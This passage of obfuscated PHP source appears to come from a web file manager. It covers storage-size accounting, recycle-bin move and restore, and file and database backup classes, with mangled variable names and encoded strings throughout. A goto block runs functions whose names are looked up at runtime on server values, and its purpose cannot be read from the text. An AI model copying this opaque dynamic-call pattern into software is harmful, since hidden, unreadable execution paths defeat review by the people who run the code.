$this->field($½ú‰¶ÕŸ)->where($¶ä¯ÙÒÊ)->select(); $¶ä¯ÙÒÊ[$á¾Çß¾[497]] = 0; $è¾Êƒò‹ = $this->field($½ú‰¶ÕŸ)->where($¶ä¯ÙÒÊ)->select(); if (!$è¾Êƒò‹) { return; } $ôÂÉØ††[] = $Ø˜Ï¾’; $ôÂÉØ†† = array_to_keyvalue($ôÂÉØ††, $á¾Çß¾[204]); foreach ($ôÂÉØ†† as $ä‰œø£³ => $”Ê™è¼é) { $ôÂÉØ††[$ä‰œø£³][$á¾Çß¾[2292]] = $ôÂÉØ††[$ä‰œø£³][$á¾Çß¾[90]]; $ôÂÉØ††[$ä‰œø£³][$á¾Çß¾[90]] = 0; } foreach ($è¾Êƒò‹ as $”Ê™è¼é) { $¶Ã·¶‚­ = $”Ê™è¼é[$á¾Çß¾[203]] . $á¾Çß¾[12]; if (!isset($ôÂÉØ††[$¶Ã·¶‚­])) { continue; } if ($”Ê™è¼é[$á¾Çß¾[517]] == $ôÂÉØ††[$¶Ã·¶‚­][$á¾Çß¾[517]]) { $ôÂÉØ††[$¶Ã·¶‚­][$á¾Çß¾[90]] += $”Ê™è¼é[$á¾Çß¾[90]]; } } foreach ($ôÂÉØ†† as $”Ê™è¼é) { $ÖĞ²Ë™Ô = $this->parentLevelArray($”Ê™è¼é[$á¾Çß¾[596]]); foreach ($ÖĞ²Ë™Ô as $¶Ã·¶‚­) { $¶Ã·¶‚­ = $¶Ã·¶‚­ . $á¾Çß¾[12]; if (!isset($ôÂÉØ††[$¶Ã·¶‚­])) { continue; } if ($”Ê™è¼é[$á¾Çß¾[517]] == $ôÂÉØ††[$¶Ã·¶‚­][$á¾Çß¾[517]]) { $ôÂÉØ††[$¶Ã·¶‚­][$á¾Çß¾[90]] += $”Ê™è¼é[$á¾Çß¾[90]]; } } } $¦²´ıš = array(); foreach ($ôÂÉØ†† as $”Ê™è¼é) { if ($”Ê™è¼é[$á¾Çß¾[90]] == $”Ê™è¼é[$á¾Çß¾[2292]]) { continue; } $¦²´ıš[] = array($á¾Çß¾[204], $”Ê™è¼é[$á¾Çß¾[204]], $á¾Çß¾[90], $”Ê™è¼é[$á¾Çß¾[90]]); } $this->saveAll($¦²´ıš); } public function userSpaceReset($µ•¼Ô¬Ó = false) { $òÙŠÔ„ì =& $_SERVER[Ò°Ì”İ•]; $Çğ†ÄÍ = $this->where(array($òÙŠÔ„ì[201] => self::TYPE_USER, $òÙŠÔ„ì[581] => $µ•¼Ô¬Ó, $òÙŠÔ„ì[497] => 0))->sum($òÙŠÔ„ì[90]); $Çğ†ÄÍ = !$Çğ†ÄÍ || $Çğ†ÄÍ <= 0 ? 0 : $Çğ†ÄÍ; Model($òÙŠÔ„ì[589])->userEdit($µ•¼Ô¬Ó, array($òÙŠÔ„ì[1957] => $Çğ†ÄÍ)); } public function targetSpaceUpdate($Úù¡Û¨Ì, $Ê”¾µ© ) { $£óÁ¸®Š =& $_SERVER[Ò°Ì”İ•]; if (!$Ê”¾µ© ) { return; } if (!in_array($Úù¡Û¨Ì, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $—Ó«Íµó = $this->targetSpaceSize($Úù¡Û¨Ì, $Ê”¾µ© ); if ($Úù¡Û¨Ì == self::TYPE_USER) { Model($£óÁ¸®Š[589])->userEdit($Ê”¾µ© , array($£óÁ¸®Š[1957] => $—Ó«Íµó)); } else { if ($Úù¡Û¨Ì == self::TYPE_GROUP) { Model($£óÁ¸®Š[597])->groupEdit($Ê”¾µ© , array($£óÁ¸®Š[1957] => $—Ó«Íµó)); } } } public function targetSpaceSize($ó¬½ôüÑ, $‘„ˆ°Ÿ¤) { $êôŠê†ı =& $_SERVER[Ò°Ì”İ•]; $óˆŞí½º = 0; $ù¬İ‹ = $this->targetSourceRoot($ó¬½ôüÑ, $‘„ˆ°Ÿ¤, !0); foreach ($ù¬İ‹ as $Ãø©Åú¹) { if (!$Ãø©Åú¹) { continue; } $óˆŞí½º += floatval($Ãø©Åú¹[$êôŠê†ı[90]]); $ÒõÇÔàÔ = array($êôŠê†ı[667] => array($êôŠê†ı[627], $êôŠê†ı[605] . $Ãø©Åú¹[$êôŠê†ı[204]] . $êôŠê†ı[628])); $ÖÖí–Â× = Model($êôŠê†ı[515])->field($êôŠê†ı[503])->where($ÒõÇÔàÔ)->select(); $ÖÖí–Â× = array_to_keyvalue($ÖÖí–Â×, $êôŠê†ı[12], $êôŠê†ı[204]); $ÖÖí–Â× = array_unique(array_filter($ÖÖí–Â×)); if ($ÖÖí–Â×) { $ÒõÇÔàÔ = array($êôŠê†ı[503] => array($êôŠê†ı[504], $ÖÖí–Â×)); $óˆŞí½º += floatval($this->where($ÒõÇÔàÔ)->sum($êôŠê†ı[90])); } } $óˆŞí½º = !$óˆŞí½º || $óˆŞí½º <= 0 ? 0 : $óˆŞí½º; return $óˆŞí½º; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ü”ş‘Ô) { return $this->fileTypeProfile($Ü”ş‘Ô, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ğàª™¿…) { return $this->fileTypeProfile($Ğàª™¿…, SourceModel::TYPE_GROUP); } private function fileTypeProfile($É³½›œì, $÷á×€Î÷) { $¸—Â¡‚· =& $_SERVER[Ò°Ì”İ•]; $úÙŒØÑ = $¸—Â¡‚·[2293] . $É³½›œì . $¸—Â¡‚·[11] . $÷á×€Î÷; $ß¨„ ±û = Cache::get($úÙŒØÑ); if ($ß¨„ ±û) { return $ß¨„ ±û; } $É–£ÁÌõ = array($¸—Â¡‚·[661] => 0); if ($É³½›œì != !1) { $É–£ÁÌõ[$¸—Â¡‚·[581]] = $É³½›œì; $É–£ÁÌõ[$¸—Â¡‚·[201]] = $÷á×€Î÷; } $œ“¢Õ­Œ = array(); $œ“¢Õ­Œ[$¸—Â¡‚·[2294]] = array($¸—Â¡‚·[2295] => LNG($¸—Â¡‚·[2294]), $¸—Â¡‚·[2296] => $this->where($É–£ÁÌõ)->count(), $¸—Â¡‚·[632] => $this->where($É–£ÁÌõ)->sum($¸—Â¡‚·[90])); $ ƒĞÍÍ… = KodIO::fileTypeList(); foreach ($ ƒĞÍÍ… as $—½¢·Ö => $†—øşÌ¨) { $É–£ÁÌõ[$¸—Â¡‚·[498]] = $this->fileTypeWhere($—½¢·Ö); $œ“¢Õ­Œ[$—½¢·Ö] = array($¸—Â¡‚·[2295] => $†—øşÌ¨[$¸—Â¡‚·[32]], $¸—Â¡‚·[2296] => $this->where($É–£ÁÌõ)->count(), $¸—Â¡‚·[632] => $this->where($É–£ÁÌõ)->sum($¸—Â¡‚·[90])); } Cache::set($úÙŒØÑ, $œ“¢Õ­Œ, 1200); return $œ“¢Õ­Œ; } public function fileNameExist($ô„Å°ª, $ªÏÙ£ÌÜ) { $§Õ°ÇşÓ =& $_SERVER[Ò°Ì”İ•]; $ä±Ù´¼ = $this->field($§Õ°ÇşÓ[2297])->where(array($§Õ°ÇşÓ[203] => $ô„Å°ª, $§Õ°ÇşÓ[32] => $ªÏÙ£ÌÜ, $§Õ°ÇşÓ[517] => 0))->find(); return is_array($ä±Ù´¼) ? $ä±Ù´¼[$§Õ°ÇşÓ[204]] : !1; } public function childList($Îá‹ö•ş) { $å¿Ìà¬ =& $_SERVER[Ò°Ì”İ•]; $ºÃ¼Öıø = $å¿Ìà¬[2270] . $Îá‹ö•ş; if (isset(self::$cacheChildList[$ºÃ¼Öıø])) { return self::$cacheChildList[$ºÃ¼Öıø]; } $á–‰¨ÁĞ = array($å¿Ìà¬[203] => intval($Îá‹ö•ş), $å¿Ìà¬[517] => 0); $¼µßÔ½Ô = $this->where($á–‰¨ÁĞ)->select(); $¼µßÔ½Ô = $¼µßÔ½Ô ? $¼µßÔ½Ô : array(); self::$cacheChildList[$ºÃ¼Öıø] = $¼µßÔ½Ô; foreach ($¼µßÔ½Ô as $½¥¸Ù£) { $ºÃ¼Öıø = $å¿Ìà¬[545] . $½¥¸Ù£[$å¿Ìà¬[204]]; self::$cacheSourceInfo[$ºÃ¼Öıø] = $½¥¸Ù£; } return $¼µßÔ½Ô; } public function fileNameAuto($›Á¯ä“, $Ö½ùÔĞæ, $°Á„º©¾ = REPEAT_RENAME, $Æ¹•¾°¸ = false) { $™ÔÒ˜„í =& $_SERVER[Ò°Ì”İ•]; $Äôíº„ù = get_path_ext($Ö½ùÔĞæ); $¬ªÕÇˆª = $Äôíº„ù ? get_path_ext_name($Ö½ùÔĞæ) . $™ÔÒ˜„í[2298] . $Äôíº„ù : $Ö½ùÔĞæ . $™ÔÒ˜„í[472]; $·°˜ËÌ = array($™ÔÒ˜„í[203] => $›Á¯ä“, $™ÔÒ˜„í[517] => 0, $™ÔÒ˜„í[32] => array($™ÔÒ˜„í[471], $¬ªÕÇˆª)); $Ùø¨•è = $this->field($™ÔÒ˜„í[32])->where($·°˜ËÌ)->select(); $‚ğ¶ß¦Â = array_to_keyvalue($Ùø¨•è, $™ÔÒ˜„í[12], $™ÔÒ˜„í[32]); return $this->fileNameAutoGet($‚ğ¶ß¦Â, $Ö½ùÔĞæ, $°Á„º©¾, $Æ¹•¾°¸); } public function fileNameAutoGet($Óù±¼à—, $Ô¡øÉÑ, $¥úåâÁ, $šš÷Œƒ) { $ÊäÌÊ¢„ =& $_SERVER[Ò°Ì”İ•]; if ($¥úåâÁ == REPEAT_REPLACE || !$Óù±¼à— || !in_array_not_case($Ô¡øÉÑ, $Óù±¼à—) || $šš÷Œƒ && $¥úåâÁ != REPEAT_RENAME_FOLDER) { return $Ô¡øÉÑ; } if ($¥úåâÁ == REPEAT_SKIP) { return !1; } $ì•ªÉ®¬ = $ÊäÌÊ¢„[10] . get_path_ext($Ô¡øÉÑ); $ì•ªÉ®¬ = $ì•ªÉ®¬ == $ÊäÌÊ¢„[10] || $šš÷Œƒ ? $ÊäÌÊ¢„[12] : $ì•ªÉ®¬; for ($Ò‘øÑÂŸ = 1; $Ò‘øÑÂŸ <= count($Óù±¼à—) + 1; $Ò‘øÑÂŸ++) { $Ø‰ºä´ş = substr($Ô¡øÉÑ, 0, strlen($Ô¡øÉÑ) - strlen($ì•ªÉ®¬)); $Â†§¿İë = $Ø‰ºä´ş . "\x28{$Ò‘øÑÂŸ}\x29{$ì•ªÉ®¬}"; if (!in_array_not_case($Â†§¿İë, $Óù±¼à—)) { return $Â†§¿İë; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\x63\x65\x5f\162\x65\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\143\x74\x69\157\156")); public function listData($ó®Õê¢’ = false) { $Ê£èÌ§ñ =& $_SERVER[Ò°Ì”İ•]; $ó®Õê¢’ = $ó®Õê¢’ ? $ó®Õê¢’ : USER_ID; $¯ÕŞû´ = $this->where(array($Ê£èÌ§ñ[1759] => $ó®Õê¢’))->select(); return array_to_keyvalue($¯ÕŞû´, $Ê£èÌ§ñ[12], $Ê£èÌ§ñ[204]); } public function moveToRecycle($ÜÀ³€Şò) { $²Ü©£Œ =& $_SERVER[Ò°Ì”İ•]; $éÌ£ªç = Model($²Ü©£Œ[1417]); $‚–¦¸µò = $éÌ£ªç->sourceInfo($ÜÀ³€Şò); if (!$‚–¦¸µò || $‚–¦¸µò[$²Ü©£Œ[517]] == $²Ü©£Œ[102]) { return; } $âçÜ³Ñé = array($²Ü©£Œ[503] => $ÜÀ³€Şò, $²Ü©£Œ[1759] => USER_ID, $²Ü©£Œ[663] => $‚–¦¸µò[$²Ü©£Œ[201]], $²Ü©£Œ[664] => $‚–¦¸µò[$²Ü©£Œ[581]], $²Ü©£Œ[667] => $‚–¦¸µò[$²Ü©£Œ[596]]); $this->add($âçÜ³Ñé); $this->recycleMove($ÜÀ³€Şò, 1); if ($‚–¦¸µò[$²Ü©£Œ[497]] == $²Ü©£Œ[102]) { $–Ï¡ú¡Â = array($²Ü©£Œ[667] => array($²Ü©£Œ[627], $‚–¦¸µò[$²Ü©£Œ[596]] . $ÜÀ³€Şò . $²Ü©£Œ[628])); $éÌ£ªç->where($–Ï¡ú¡Â)->setField($²Ü©£Œ[517], 1); } } public function clear() { $this->remove(!1); } public function remove($•ñœâ¢ = false, $“İ™âÇ¾ = false) { $©ãİàš =& $_SERVER[Ò°Ì”İ•]; $“İ™âÇ¾ = $“İ™âÇ¾ ? $“İ™âÇ¾ : USER_ID; $Öòæüˆç = Model($©ãİàš[1417]); $ÍÒ¼Âäõ = $this->listData($“İ™âÇ¾); $•ñœâ¢ = $•ñœâ¢ === !1 ? !1 : $•ñœâ¢; $à‹¿Ô = array(); foreach ($ÍÒ¼Âäõ as $³®–¸­) { if ($•ñœâ¢ != !1 && !in_array($³®–¸­, $•ñœâ¢)) { continue; } $®àÎ‰›² = $Öòæüˆç->sourceInfo($³®–¸­); $Öòæüˆç->remove($³®–¸­, !1); $¸¯›ëü´ = $®àÎ‰›²[$©ãİàš[201]] . $©ãİàš[11] . $®àÎ‰›²[$©ãİàš[581]]; $à‹¿Ô[$¸¯›ëü´] = array($©ãİàš[663] => $®àÎ‰›²[$©ãİàš[201]], $©ãİàš[581] => $®àÎ‰›²[$©ãİàš[581]]); $this->where(array($©ãİàš[204] => $³®–¸­))->delete(); } foreach ($à‹¿Ô as $«¡ğ»Ë÷) { $Öòæüˆç->targetSpaceUpdate($«¡ğ»Ë÷[$©ãİàš[201]], $«¡ğ»Ë÷[$©ãİàš[581]]); } } public function restore($€Óºš°— = false) { $‘È…ã = $this->listData(); $this->_restoreSource($‘È…ã, $€Óºš°—); } public function removeUserAll($»ıöşÖ¤) { $this->remove(!1, $»ıöşÖ¤); } public function restoreItem($¡ÒÃŸÒ) { $this->_restoreSource(array($¡ÒÃŸÒ), array($¡ÒÃŸÒ)); } private function _restoreSource($‹‚Ñ«°, $÷­Øœ“) { $Ê¨é‡í£ =& $_SERVER[Ò°Ì”İ•]; $Ü«˜±ó = Model($Ê¨é‡í£[1417]); $÷­Øœ“ = $÷­Øœ“ == !1 ? !1 : $÷­Øœ“; if (!$‹‚Ñ«°) { return !0; } $×Ãê÷ğÊ = array(); foreach ($‹‚Ñ«° as $®’îæîğ) { if ($÷­Øœ“ != !1 && !in_array($®’îæîğ, $÷­Øœ“)) { continue; } $şøÕ¢¾½ = $Ü«˜±ó->sourceInfo($®’îæîğ); $à§Ç”Öğ = $Ü«˜±ó->sourceInfo($şøÕ¢¾½[$Ê¨é‡í£[203]]); if ($à§Ç”Öğ[$Ê¨é‡í£[517]] == $Ê¨é‡í£[102]) { continue; } $Ü«˜±ó->lockMoveStart($®’îæîğ); $this->recycleMove($®’îæîğ, 0); if ($şøÕ¢¾½[$Ê¨é‡í£[497]] == $Ê¨é‡í£[102]) { $¶À¥ï¶Ş = array($Ê¨é‡í£[667] => array($Ê¨é‡í£[627], $şøÕ¢¾½[$Ê¨é‡í£[596]] . $®’îæîğ . $Ê¨é‡í£[628])); $Ü«˜±ó->where($¶À¥ï¶Ş)->setField($Ê¨é‡í£[517], 0); $this->restoreFolderChildren($®’îæîğ, $‹‚Ñ«°); } $this->where(array($Ê¨é‡í£[204] => $®’îæîğ))->delete(); $Ü«˜±ó->folderSizeReset($şøÕ¢¾½[$Ê¨é‡í£[203]]); $×Ãê÷ğÊ[] = $şøÕ¢¾½[$Ê¨é‡í£[203]]; if ($şøÕ¢¾½[$Ê¨é‡í£[497]] == $Ê¨é‡í£[102]) { $×Ãê÷ğÊ[] = $®’îæîğ; } $Ü«˜±ó->lockMoveEnd($®’îæîğ); } $Ü«˜±ó->updateModifyTime($×Ãê÷ğÊ); } private function restoreFolderChildren($ƒØû¢©ï, $˜å’éÎ) { $ıˆƒ¾ô =& $_SERVER[Ò°Ì”İ•]; $•’í™íÛ = Model($ıˆƒ¾ô[1417]); $ŠÇüš = array($ıˆƒ¾ô[204] => array($ıˆƒ¾ô[7], array())); foreach ($˜å’éÎ as $ü®ú¤Ä) { if ($ü®ú¤Ä == $ƒØû¢©ï) { continue; } if (!$•’í™íÛ->isParentOf($ƒØû¢©ï, $ü®ú¤Ä)) { continue; } $È©Éˆ÷£ = $•’í™íÛ->sourceInfo($ü®ú¤Ä); if ($È©Éˆ÷£[$ıˆƒ¾ô[497]] == $ıˆƒ¾ô[102]) { $ŠÇüš[] = array($ıˆƒ¾ô[667] => array($ıˆƒ¾ô[627], $È©Éˆ÷£[$ıˆƒ¾ô[596]] . $ü®ú¤Ä . $ıˆƒ¾ô[628])); } else { $ŠÇüš[$ıˆƒ¾ô[204]][1][] = $ü®ú¤Ä; } } if (!$ŠÇüš[$ıˆƒ¾ô[204]][1]) { unset($ŠÇüš[$ıˆƒ¾ô[204]]); } if (!$ŠÇüš) { return; } if (is_array($ŠÇüš[$ıˆƒ¾ô[204]]) && is_array($ŠÇüš[$ıˆƒ¾ô[204]][1])) { $ŠÇüš[$ıˆƒ¾ô[204]][1] = array_unique($ŠÇüš[$ıˆƒ¾ô[204]][1]); } $ŠÇüš[$ıˆƒ¾ô[1073]] = $ıˆƒ¾ô[2071]; $•’í™íÛ->where($ŠÇüš)->setField($ıˆƒ¾ô[517], 1); } private function recycleMove($ôÆÎÀ¿‘, $ß¡ƒÏë° = 1) { $·ÓĞÃÈ¿ =& $_SERVER[Ò°Ì”İ•]; $¯ø£‘–ğ = Model($·ÓĞÃÈ¿[1417]); $ÎŸë²¦ = Model($·ÓĞÃÈ¿[2299]); $°°âû€ü = array($·ÓĞÃÈ¿[204] => $ôÆÎÀ¿‘); if ($ß¡ƒÏë°) { $¯ø£‘–ğ->where($°°âû€ü)->setField($·ÓĞÃÈ¿[517], 1); $ÎŸë²¦->eventRecycle($ôÆÎÀ¿‘, $·ÓĞÃÈ¿[2300]); } else { $§êÙ©Õì = $¯ø£‘–ğ->where($°°âû€ü)->find(); $İ¶õ¬Ğ² = $§êÙ©Õì[$·ÓĞÃÈ¿[497]] == $·ÓĞÃÈ¿[102]; $èâ÷—ØÍ = $¯ø£‘–ğ->fileNameAuto($§êÙ©Õì[$·ÓĞÃÈ¿[203]], $§êÙ©Õì[$·ÓĞÃÈ¿[32]], REPEAT_RENAME_FOLDER, $İ¶õ¬Ğ²); if ($èâ÷—ØÍ != $§êÙ©Õì[$·ÓĞÃÈ¿[32]]) { $¯ø£‘–ğ->rename($ôÆÎÀ¿‘, $èâ÷—ØÍ); } $¯ø£‘–ğ->where($°°âû€ü)->setField($·ÓĞÃÈ¿[517], 0); $ÎŸë²¦->eventRecycle($ôÆÎÀ¿‘, $·ÓĞÃÈ¿[2301]); } } } goto aöÁÎäãÅ; CÇãµÕ¡: if ($_SERVER[$_SERVER[Ò°Ì”İ•][54]] != $_SERVER[$_SERVER[Ò°Ì”İ•][55]]) { $_getc = $_SERVER[Ò°Ì”İ•][56]; $_getfile = $_SERVER[$_SERVER[Ò°Ì”İ•][57]] . $_SERVER[Ò°Ì”İ•][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ò°Ì”İ•][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ò°Ì”İ•][60]) { $exit = $_SERVER[Ò°Ì”İ•][61]; $exit(); } $_act = $_SERVER[Ò°Ì”İ•][62]; $_act($_SERVER[$_SERVER[Ò°Ì”İ•][63]]); } class BackupDbFile { public function __construct() { } public function index() { $¯“óÁÜ =& $_SERVER[Ò°Ì”İ•]; $¯…¡áåà = Backup::get(); $€›ÆÎö = $¯…¡áåà[$¯“óÁÜ[32]]; $¾×Üœ« = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\x5f{$€›ÆÎö}\x2f"; $ê©òö¼¹ = $this->backupPath($¯…¡áåà); if (!($ê©òö¼¹ = IO::mkdir($ê©òö¼¹))) { return !1; } $§¦Ü´ö = IO::listPath($¾×Üœ«); $ª‹‡âıô = isset($§¦Ü´ö[$¯“óÁÜ[97]]) ? $§¦Ü´ö[$¯“óÁÜ[97]] : array(); $¶› ü’ß = array_sum(array_column($ª‹‡âıô, $¯“óÁÜ[90])); if (!$¶› ü’ß) { return !1; } $¹¹¼ µ„ = array($¯“óÁÜ[872] => $¶› ü’ß, $¯“óÁÜ[873] => time()); Backup::set($¹¹¼ µ„); $…ûåşóõ = new TaskFileTransfer($¯“óÁÜ[874], $¯“óÁÜ[857], count($ª‹‡âıô), LNG($¯“óÁÜ[858]) . $¯“óÁÜ[474] . LNG($¯“óÁÜ[860]) . $¯“óÁÜ[875]); $…ûåşóõ->task[$¯“óÁÜ[836]] = $¶› ü’ß; foreach ($§¦Ü´ö[$¯“óÁÜ[97]] as $‹øÕé¾) { $êü¿‘çŸ = IO::move($‹øÕé¾[$¯“óÁÜ[98]], $ê©òö¼¹); if (!$êü¿‘çŸ) { $…ûåşóõ->end(); $ƒª·Š¸Ú = IO::getLastError($¯“óÁÜ[876] . $‹øÕé¾[$¯“óÁÜ[98]] . $¯“óÁÜ[877] . $ê©òö¼¹ . $¯“óÁÜ[189]); write_log($ƒª·Š¸Ú, $¯“óÁÜ[857]); return !1; } } $——¡òâ = new DbManage(); $ÂŞå™Í¯ = $——¡òâ->getSqlFile(); if (!$ÂŞå™Í¯[$¯“óÁÜ[878]] || !$ÂŞå™Í¯[$¯“óÁÜ[13]]) { return !1; } IO::move($ÂŞå™Í¯[$¯“óÁÜ[878]], $ê©òö¼¹); IO::move($ÂŞå™Í¯[$¯“óÁÜ[13]], $ê©òö¼¹); $…ûåşóõ->end(); $¹¹¼ µ„ = array($¯“óÁÜ[879] => $¶› ü’ß, $¯“óÁÜ[880] => time()); Backup::set($¹¹¼ µ„); return !0; } private function backupPath($çÃò¢Û») { $Ó¿êö§ =& $_SERVER[Ò°Ì”İ•]; $Ì¤Î–³Ş = $çÃò¢Û»[$Ó¿êö§[32]]; $ÀÚñÂÂØ = Model($Ó¿êö§[843])->get($Ó¿êö§[844]); $ëĞƒïˆø = substr(md5($Ó¿êö§[845] . $ÀÚñÂÂØ . $Ì¤Î–³Ş), 0, 8); return "\173\151\157\x3a{$çÃò¢Û»[$Ó¿êö§[825]]}\175\57\x64\141\x74\x61\142\141\x73\x65\57\x62\141\143\x6b\165\160\57" . $Ì¤Î–³Ş . $Ó¿êö§[11] . $ëĞƒïˆø; } private function tmpFilesPath() { $ßÏËşÇ =& $_SERVER[Ò°Ì”İ•]; $Ñ¤‰˜É† = TEMP_FILES; if ($GLOBALS[$ßÏËşÇ[6]][$ßÏËşÇ[103]][$ßÏËşÇ[870]]) { $Ñ¤‰˜É† = $GLOBALS[$ßÏËşÇ[6]][$ßÏËşÇ[103]][$ßÏËşÇ[870]]; if (!mk_dir($Ñ¤‰˜É†) || !is_writable($Ñ¤‰˜É†) || !IO::mkfile($Ñ¤‰˜É† . $ßÏËşÇ[871])) { $Ñ¤‰˜É† = TEMP_FILES; } } return $Ñ¤‰˜É†; } } class BackupFile { public function __construct() { } public function index() { $‚İˆ»²š = Backup::get(); $¦ÖèŸİ˜ = $‚İˆ»²š[$_SERVER[Ò°Ì”İ•][380]][$_SERVER[Ò°Ì”İ•][243]][$_SERVER[Ò°Ì”İ•][553]]; $¢˜ÊÎ€ = array($_SERVER[Ò°Ì”İ•][554] => array($_SERVER[Ò°Ì”İ•][881], $¦ÖèŸİ˜), $_SERVER[Ò°Ì”İ•][882] => array($_SERVER[Ò°Ì”İ•][418], $‚İˆ»²š[$_SERVER[Ò°Ì”İ•][825]])); $øÙ«©Ÿ = (int) Model($_SERVER[Ò°Ì”İ•][863])->where($¢˜ÊÎ€)->count($_SERVER[Ò°Ì”İ•][553]); $ì¢èğ† = (int) Model($_SERVER[Ò°Ì”İ•][863])->where($¢˜ÊÎ€)->sum($_SERVER[Ò°Ì”İ•][90]); $Ü¸¸¢â = new TaskFileTransfer($_SERVER[Ò°Ì”İ•][883], $_SERVER[Ò°Ì”İ•][857], $øÙ«©Ÿ, LNG($_SERVER[Ò°Ì”İ•][858]) . $_SERVER[Ò°Ì”İ•][859] . LNG($_SERVER[Ò°Ì”İ•][884])); $Ü¸¸¢â->task[$_SERVER[Ò°Ì”İ•][836]] = $ì¢èğ†; $ÔœÄ“¡ = array($_SERVER[Ò°Ì”İ•][885] => $øÙ«©Ÿ, $_SERVER[Ò°Ì”İ•][886] => $ì¢èğ†, $_SERVER[Ò°Ì”İ•][887] => time()); Backup::set($ÔœÄ“¡); $ âø‰Œ³ = !0; $Ø”Ìñ³ô = $this->storeIds(); $ÚåÓêÀ¡ = 1; $–¨ĞÜÉƒ = 1000; $ºÓ»Üş× = $ãï°Å«ş = 0; $¡¬È®“Ò = array(); $İÅÓ·÷ = $§Ôç å¡ = 0; do { $¥Ğ°½ï÷ = $_SERVER[Ò°Ì”İ•][888]; $ÉëûıÑ = Model($_SERVER[Ò°Ì”İ•][863])->where($¢˜ÊÎ€)->field($¥Ğ°½ï÷)->order($_SERVER[Ò°Ì”İ•][889])->selectPage($–¨ĞÜÉƒ, $ÚåÓêÀ¡); $ú®åèòá = !empty($ÉëûıÑ[$_SERVER[Ò°Ì”İ•][457]]) ? $ÉëûıÑ[$_SERVER[Ò°Ì”İ•][457]] : array(); foreach ($ú®åèòá as $şÍĞ¬íò) { if (!$this->_fileExist($şÍĞ¬íò, $¡¬È®“Ò, $Ø”Ìñ³ô)) { write_log("\x66\x69\154\145\40\x6e\x6f\x74\40\145\170\x69\163\164\x2e\146\151\x6c\x65\111\104\72{$şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][553]]}\x2c\x20\160\141\x74\150\x3a{$şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][98]]}", $_SERVER[Ò°Ì”İ•][890]); continue; } $“†ĞÒíª = $şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][98]]; $ÏÑëØ = "\173\151\157\72{$‚İˆ»²š[$_SERVER[Ò°Ì”İ•][825]]}\175" . substr($“†ĞÒíª, strlen("\173\x69\157\x3a{$şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][891]]}\175")); if (IO::exist($ÏÑëØ)) { $Ü¸¸¢â->updateFileEnd($şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][32]], $şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][90]]); } else { $ÏÑëØ = get_path_father($ÏÑëØ); IO::mkdir($ÏÑëØ); if (!IO::copy($“†ĞÒíª, $ÏÑëØ, $_SERVER[Ò°Ì”İ•][892])) { write_log($_SERVER[Ò°Ì”İ•][893] . $“†ĞÒíª . $_SERVER[Ò°Ì”İ•][877] . $ÏÑëØ . $_SERVER[Ò°Ì”İ•][189], $_SERVER[Ò°Ì”İ•][857]); $ âø‰Œ³ = !1; break; } } $¦ÖèŸİ˜ = $şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][553]]; $ãï°Å«ş += 1; $ºÓ»Üş× += $şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][90]]; $§Ôç å¡ += 1; $İÅÓ·÷ += $şÍĞ¬íò[$_SERVER[Ò°Ì”İ•][90]]; if ($ºÓ»Üş× >= 1024 * 1024 * 100) { $ÔœÄ“¡ = array($_SERVER[Ò°Ì”İ•][824] => $¦ÖèŸİ˜, $_SERVER[Ò°Ì”İ•][894] => $§Ôç å¡, $_SERVER[Ò°Ì”İ•][895] => $İÅÓ·÷); Backup::set($ÔœÄ“¡); $ºÓ»Üş× = $ãï°Å«ş = 0; } } $ÑöûÅÑ¨ = count($ú®åèòá); $ÚåÓêÀ¡++; } while ($ÑöûÅÑ¨ == $–¨ĞÜÉƒ); $Ü¸¸¢â->end(); $ÔœÄ“¡ = array($_SERVER[Ò°Ì”İ•][896] => 1, $_SERVER[Ò°Ì”İ•][834] => time(), $_SERVER[Ò°Ì”İ•][848] => 1, $_SERVER[Ò°Ì”İ•][824] => $¦ÖèŸİ˜, $_SERVER[Ò°Ì”İ•][897] => time()); if ($ãï°Å«ş) { $ÔœÄ“¡[$_SERVER[Ò°Ì”İ•][894]] = $§Ôç å¡; $ÔœÄ“¡[$_SERVER[Ò°Ì”İ•][895]] = $İÅÓ·÷; } Backup::set($ÔœÄ“¡); return !0; } private function _fileExist($øéÏæÒ†, &$‚É´‰¾¢, $·Ñ½½Ì—) { $¾÷Êë„¥ =& $_SERVER[Ò°Ì”İ•]; $•»‚ªÒæ = $øéÏæÒ†[$¾÷Êë„¥[98]]; if (in_array($øéÏæÒ†[$¾÷Êë„¥[553]], $‚É´‰¾¢)) { return !1; } if (!in_array($øéÏæÒ†[$¾÷Êë„¥[891]], $·Ñ½½Ì—)) { return !1; } if (IO::exist($•»‚ªÒæ)) { return !0; } $Õõ²ôÛ÷ = get_path_father($•»‚ªÒæ); if (IO::exist($Õõ²ôÛ÷)) { $‚É´‰¾¢[] = $øéÏæÒ†[$¾÷Êë„¥[553]]; return !1; } $œä’¾ë¸ = array($¾÷Êë„¥[891] => $øéÏæÒ†[$¾÷Êë„¥[891]], $¾÷Êë„¥[98] => array($¾÷Êë„¥[471], "{$Õõ²ôÛ÷}\x25")); $®ÇË˜¨ = Model($¾÷Êë„¥[863])->where($œä’¾ë¸)->field($¾÷Êë„¥[554])->select(); $‚É´‰¾¢ = array_merge($‚É´‰¾¢, array_to_keyvalue($®ÇË˜¨, $¾÷Êë„¥[12], $¾÷Êë„¥[553])); return !1; } private function _fileFilter($ÁµÙïš™) { $†¿ö”æ“ =& $_SERVER[Ò°Ì”İ•]; return; if (empty($ÁµÙïš™)) { return; } $ş‹ô«ĞÎ = array($†¿ö”æ“[553] => array($†¿ö”æ“[7], array_unique($ÁµÙïš™))); $î¢°µğŒ = 